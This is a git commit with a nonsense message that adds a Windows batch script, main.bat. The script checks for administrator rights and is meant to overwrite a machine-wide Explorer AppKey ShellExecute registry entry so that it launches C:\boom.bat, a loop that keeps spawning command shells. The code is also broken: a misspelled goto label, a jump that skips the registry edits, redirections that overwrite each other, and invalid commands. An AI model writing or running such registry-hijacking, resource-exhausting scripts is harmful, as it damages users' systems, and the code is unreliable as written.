d0ea755f94336a7eb151f697f4e35098b7215042
louis <louis.turpault@gmail.com>
2023-11-30 16:03:17 -0500

    nerfiuheg

---
+++ main.bat
@@ -0,0 +1,34 @@
+@echo off
+
+goto check_Permissions
+
+:check_Permissions
+echo Administrative permissions required. Detecting permissions...
+
+net session >nul 2>&1
+if %errorLevel% == 0 (
+    echo Success: Administrative permissions confirmed.
+    goto modify_registery
+) else (
+    echo Failure: Current permissions inadequate.
+    pause 3
+    exit
+)
+
+:modify_registry
+goto boom
+REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\18\ShellExecute
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AppKey\18\ShellExecute /t REG_SZ /d C:\boom.bat /f
+
+:boom
+cd \
+del boom.bat
+echo :top > boom.bat
+echo cmd.exe > boom.bat
+echo goto top > boom.bat
+cd -
+
+
+
+
+pause >nul
